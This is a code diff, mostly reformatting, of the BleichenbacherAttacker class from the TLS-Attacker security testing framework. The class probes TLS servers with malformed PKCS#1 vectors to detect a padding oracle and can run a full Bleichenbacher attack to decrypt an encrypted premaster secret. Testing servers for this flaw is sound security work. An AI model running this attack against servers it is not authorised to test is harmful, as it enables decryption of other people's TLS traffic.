@@ -7,7 +7,10 @@
  * Licensed under Apache License 2.0
  * http://www.apache.org/licenses/LICENSE-2.0
  */
+
 package de.rub.nds.tlsattacker.attacks.impl;
+
+import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
 
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.tlsattacker.attacks.config.BleichenbacherCommandConfig;
@@ -35,7 +38,6 @@ import de.rub.nds.tlsattacker.core.workflow.ParallelExecutor;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
-import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
 import java.io.IOException;
 import java.math.BigInteger;
 import java.security.interfaces.RSAPublicKey;
@@ -45,9 +47,8 @@ import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
 /**
- * Sends differently formatted PKCS#1 messages to the TLS server and observes
- * the server responses. In case there are differences in the server responses,
- * it is very likely that it is possible to execute Bleichenbacher attacks.
+ * Sends differently formatted PKCS#1 messages to the TLS server and observes the server responses. In case there are
+ * differences in the server responses, it is very likely that it is possible to execute Bleichenbacher attacks.
  */
 public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig> {
 
@@ -64,7 +65,6 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     private List<VectorResponse> fingerprintPairList;
 
     /**
-     *
      * @param bleichenbacherConfig
      * @param baseConfig
      */
@@ -74,19 +74,17 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     }
 
     /**
-     *
      * @param bleichenbacherConfig
      * @param baseConfig
      * @param executor
      */
     public BleichenbacherAttacker(BleichenbacherCommandConfig bleichenbacherConfig, Config baseConfig,
-            ParallelExecutor executor) {
+        ParallelExecutor executor) {
         super(bleichenbacherConfig, baseConfig);
         this.executor = executor;
     }
 
     /**
-     *
      * @param type
      * @param encryptedPMS
      * @return
@@ -96,14 +94,13 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         WorkflowTrace trace = BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig, type, encryptedPMS);
         State state = new State(tlsConfig, trace);
         tlsConfig.setWorkflowExecutorShouldClose(false);
-        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
-                tlsConfig.getWorkflowExecutorType(), state);
+        WorkflowExecutor workflowExecutor =
+            WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
         workflowExecutor.executeWorkflow();
         return state;
     }
 
     /**
-     *
      * @return
      */
     @Override
@@ -114,25 +111,6 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
             return true;
         }
         return false;
-    }
-
-    public EqualityError getEqualityError() {
-        Config tlsConfig = getTlsConfig();
-        RSAPublicKey publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
-        if (publicKey == null) {
-            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
-            return null;
-        }
-        LOGGER.info("Fetched the following server public key: " + publicKey);
-        List<Pkcs1Vector> pkcs1Vectors = Pkcs1VectorGenerator.generatePkcs1Vectors(publicKey, config.getType(),
-                tlsConfig.getDefaultHighestClientProtocolVersion());
-        // we execute the attack with different protocol flows and
-        // return true as soon as we find the first inconsistency
-        CONSOLE.info("A server is considered vulnerable to this attack if it responds differently to the test vectors.");
-        CONSOLE.info("A server is considered secure if it always responds the same way.");
-        LOGGER.debug("Testing: " + config.getWorkflowType());
-        errorType = isVulnerable(pkcs1Vectors, publicKey);
-        return errorType;
     }
 
     public EqualityError isVulnerable(List<Pkcs1Vector> pkcs1Vectors, RSAPublicKey publicKey) {
@@ -148,18 +126,18 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
             // Socket Equality Errors can be caused by problems on on the
             // network. In this case we do a rescan
             // and check if we find the exact same answer behaviour (twice)
-            List<VectorResponse> secondBleichenbacherVectorMap = getBleichenbacherMap(config.getWorkflowType(),
-                    pkcs1Vectors, publicKey);
+            List<VectorResponse> secondBleichenbacherVectorMap =
+                getBleichenbacherMap(config.getWorkflowType(), pkcs1Vectors, publicKey);
             EqualityError error2 = getEqualityError(secondBleichenbacherVectorMap);
             BleichenbacherVulnerabilityMap mapOne = new BleichenbacherVulnerabilityMap(fingerprintPairList, error);
-            BleichenbacherVulnerabilityMap mapTwo = new BleichenbacherVulnerabilityMap(secondBleichenbacherVectorMap,
-                    error2);
+            BleichenbacherVulnerabilityMap mapTwo =
+                new BleichenbacherVulnerabilityMap(secondBleichenbacherVectorMap, error2);
             if (mapOne.looksIdentical(mapTwo)) {
-                List<VectorResponse> thirdBleichenbacherVectorMap = getBleichenbacherMap(config.getWorkflowType(),
-                        pkcs1Vectors, publicKey);
+                List<VectorResponse> thirdBleichenbacherVectorMap =
+                    getBleichenbacherMap(config.getWorkflowType(), pkcs1Vectors, publicKey);
                 EqualityError error3 = getEqualityError(secondBleichenbacherVectorMap);
-                BleichenbacherVulnerabilityMap mapThree = new BleichenbacherVulnerabilityMap(
-                        thirdBleichenbacherVectorMap, error3);
+                BleichenbacherVulnerabilityMap mapThree =
+                    new BleichenbacherVulnerabilityMap(thirdBleichenbacherVectorMap, error3);
                 if (!mapTwo.looksIdentical(mapThree)) {
                     LOGGER.debug("The third scan prove this vulnerability to be non existent");
                     shakyScans = true;
@@ -177,8 +155,28 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         return error;
     }
 
+    public EqualityError getEqualityError() {
+        Config tlsConfig = getTlsConfig();
+        RSAPublicKey publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
+        if (publicKey == null) {
+            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
+            return null;
+        }
+        LOGGER.info("Fetched the following server public key: " + publicKey);
+        List<Pkcs1Vector> pkcs1Vectors =
+            Pkcs1VectorGenerator.generatePkcs1Vectors(publicKey, config.getType(),
+                tlsConfig.getDefaultHighestClientProtocolVersion());
+        // we execute the attack with different protocol flows and
+        // return true as soon as we find the first inconsistency
+        CONSOLE
+            .info("A server is considered vulnerable to this attack if it responds differently to the test vectors.");
+        CONSOLE.info("A server is considered secure if it always responds the same way.");
+        LOGGER.debug("Testing: " + config.getWorkflowType());
+        errorType = isVulnerable(pkcs1Vectors, publicKey);
+        return errorType;
+    }
+
     /**
-     *
      * @param bleichenbacherVectorMap
      * @return
      */
@@ -205,20 +203,21 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     }
 
     private List<VectorResponse> getBleichenbacherMap(BleichenbacherWorkflowType bbWorkflowType,
-            List<Pkcs1Vector> pkcs1Vectors, RSAPublicKey publicKey) {
+        List<Pkcs1Vector> pkcs1Vectors, RSAPublicKey publicKey) {
         Config tlsConfig = getTlsConfig();
         tlsConfig.setWorkflowExecutorShouldClose(false);
         List<VectorResponse> bleichenbacherVectorMap = new LinkedList<>();
         List<State> stateList = new LinkedList<>();
         List<StateVectorPair> stateVectorPairList = new LinkedList<>();
         for (Pkcs1Vector pkcs1Vector : pkcs1Vectors) {
-            WorkflowTrace trace = BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig, bbWorkflowType,
+            WorkflowTrace trace =
+                BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig, bbWorkflowType,
                     pkcs1Vector.getEncryptedValue());
             State state = new State(tlsConfig, trace);
             stateList.add(state);
             stateVectorPairList.add(new StateVectorPair(state, pkcs1Vector));
         }
-        executor.bulkExecuteStateTasks(stateList);
+        executor.bulkExecuteClientStateTasks(stateList);
         for (StateVectorPair stateVectorPair : stateVectorPairList) {
             processFinishedStateVectorPair(stateVectorPair, bleichenbacherVectorMap);
         }
@@ -230,8 +229,9 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         // future versions.
         for (StateVectorPair pair : stateVectorPairList) {
             if (pair.getState().getTlsContext().getServerRsaModulus() != null
-                    && !pair.getState().getTlsContext().getServerRsaModulus().equals(publicKey.getModulus())) {
-                throw new OracleUnstableException("Server sent us a different publickey during the scan. Aborting test");
+                && !pair.getState().getTlsContext().getServerRsaModulus().equals(publicKey.getModulus())) {
+                throw new OracleUnstableException(
+                    "Server sent us a different public key during the scan. Aborting test");
             }
         }
 
@@ -239,12 +239,13 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     }
 
     private void processFinishedStateVectorPair(StateVectorPair stateVectorPair,
-            List<VectorResponse> bleichenbacherVectorMap) {
+        List<VectorResponse> bleichenbacherVectorMap) {
         if (stateVectorPair.getState().getWorkflowTrace().executedAsPlanned()) {
             ResponseFingerprint fingerprint = ResponseExtractor.getFingerprint(stateVectorPair.getState());
             bleichenbacherVectorMap.add(new VectorResponse(stateVectorPair.getVector(), fingerprint));
         } else {
-            LOGGER.warn("Could not execute Workflow. Something went wrong... Check the debug output for more information");
+            LOGGER
+                .warn("Could not execute Workflow. Something went wrong... Check the debug output for more information");
         }
         clearConnections(stateVectorPair.getState());
 
@@ -258,7 +259,8 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
             return fingerprint;
         } else {
             clearConnections(state);
-            LOGGER.warn("Could not execute Workflow. Something went wrong... Check the debug output for more information");
+            LOGGER
+                .warn("Could not execute Workflow. Something went wrong... Check the debug output for more information");
         }
         return null;
     }
@@ -283,18 +285,18 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
 
         if (config.getEncryptedPremasterSecret() == null) {
             throw new ConfigurationException("You have to set the encrypted premaster secret you are "
-                    + "going to decrypt");
+                + "going to decrypt");
         }
 
         LOGGER.info("Fetched the following server public key: " + publicKey);
         byte[] pms = ArrayConverter.hexStringToByteArray(config.getEncryptedPremasterSecret());
         if ((pms.length * Bits.IN_A_BYTE) != publicKey.getModulus().bitLength()) {
             throw new ConfigurationException("The length of the encrypted premaster secret you have "
-                    + "is not equal to the server public key length. Have you selected the correct value?");
+                + "is not equal to the server public key length. Have you selected the correct value?");
         }
-        RealDirectMessagePkcs1Oracle oracle = new RealDirectMessagePkcs1Oracle(publicKey, getTlsConfig(),
-                extractValidFingerprint(publicKey, tlsConfig.getDefaultHighestClientProtocolVersion()), null,
-                vulnerableType);
+        RealDirectMessagePkcs1Oracle oracle =
+            new RealDirectMessagePkcs1Oracle(publicKey, getTlsConfig(), extractValidFingerprint(publicKey,
+                tlsConfig.getDefaultHighestClientProtocolVersion()), null, vulnerableType);
         Bleichenbacher attacker = new Bleichenbacher(pms, oracle, config.isMsgPkcsConform());
         attacker.attack();
         BigInteger solution = attacker.getSolution();
@@ -303,11 +305,10 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
 
     private ResponseFingerprint extractValidFingerprint(RSAPublicKey publicKey, ProtocolVersion version) {
         return getFingerprint(vulnerableType, Pkcs1VectorGenerator.generateCorrectPkcs1Vector(publicKey, version)
-                .getEncryptedValue());
+            .getEncryptedValue());
     }
 
     /**
-     *
      * @return
      */
     public BleichenbacherWorkflowType getVulnerableType() {
@@ -323,7 +324,6 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     }
 
     /**
-     *
      * @return
      */
     public EqualityError getErrorType() {
@@ -331,7 +331,6 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     }
 
     /**
-     *
      * @return
      */
     public boolean isShakyScans() {
